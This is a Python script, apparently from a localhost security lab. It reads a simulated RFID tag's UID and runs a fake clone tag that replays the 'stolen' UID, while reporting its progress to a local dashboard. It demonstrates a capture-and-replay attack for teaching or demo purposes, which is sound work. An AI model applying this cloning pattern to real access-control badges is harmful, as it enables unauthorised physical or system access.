#!/usr/bin/env python3
import socket, json, time, threading
from colorama import Fore, init
import requests
from datetime import datetime

init(autoreset=True)

def send_to_dashboard(proto, msg, cls):
    try:
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        requests.post('http://127.0.0.1:8080/api/log', json={
            't': now, 'proto': proto, 'msg': msg, 'cls': cls
        }, timeout=0.5)
    except:
        pass

def read_original_uid() -> str:
    s = socket.socket()
    s.settimeout(2)
    s.connect(('127.0.0.1', 6001))
    s.send(json.dumps({'cmd': 'QUERY'}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp.get('uid', '')

class CloneTag:
    def __init__(self, cloned_uid: str, port: int = 6003):
        self.uid = cloned_uid
        self.port = port
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(('127.0.0.1', port))
        self.srv.listen(5)
        print(f'{Fore.RED}[CLONE TAG] Running on port {port}')
        print(f'{Fore.RED}[CLONE TAG] Broadcasting STOLEN UID={cloned_uid}')

    def handle(self, conn, addr):
        try:
            while True:
                data = conn.recv(256)
                if not data:
                    break
                req = json.loads(data.decode())
                if req.get('cmd') == 'QUERY':
                    resp = {
                        'status': 'TAG_PRESENT',
                        'uid': self.uid,
                        'type': 'EM4100_CLONE',
                        'rssi': -38
                    }
                    conn.send(json.dumps(resp).encode() + b'\n')
        finally:
            conn.close()

    def run(self):
        while True:
            c, a = self.srv.accept()
            threading.Thread(target=self.handle, args=(c, a), daemon=True).start()

print('[*] Step 1: Reading original card UID...')
original_uid = read_original_uid()
print(f'[*] Captured UID: {original_uid}')
print('[*] Step 2: Starting clone tag...')

# 1. Tạo một hàm chạy vòng lặp 5 giây để báo lên Dashboard
def dashboard_loop():
    while True:
        send_to_dashboard('RFID', f'CLONING Tag broadcasting UID={original_uid}', 'NORMAL')
        import time
        time.sleep(5)

# 2. Khởi chạy vòng lặp đó ở một luồng ngầm (daemon thread)
import threading
threading.Thread(target=dashboard_loop, daemon=True).start()

# 3. Khởi động server thẻ giả (hàm này sẽ chạy 24/24 ở luồng chính)
CloneTag(original_uid).run()
